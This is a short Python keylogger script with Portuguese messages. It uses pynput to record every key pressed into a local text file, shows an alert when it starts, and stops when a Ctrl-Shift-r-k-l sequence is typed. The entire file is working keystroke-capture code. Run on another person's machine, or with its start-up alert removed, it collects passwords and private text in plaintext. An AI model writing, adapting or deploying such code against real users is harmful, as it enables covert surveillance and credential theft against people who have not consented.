from pynput.keyboard import Listener, Key
from collections import deque
import pyautogui


password = ["Key.ctrl_l","Key.shift","r\n","k\n","l\n"]
keys = deque(maxlen=5)

pyautogui.alert("O Keylogger foi Iniciado!")

def log(text):
    with open("keyboarkeys.txt", "a") as file_log:
        file_log.write(text)

def screen(key):
    try:
        log(key.char)
        keys.append(key.char + "\n")
        print(key, keys)
    except AttributeError:
        log(" <"+str(key)+"> \n")
        keys.append(str(key))
        print(key, keys)
    except TypeError:
        keys.append('Numero <0/9>')
        print(key, keys)
            
    if "".join(password) == "".join(keys):
        return False

with Listener(on_release = screen) as listener:
    listener.join() 

pyautogui.confirm("Você Deseja Finalizar o Keylogger?")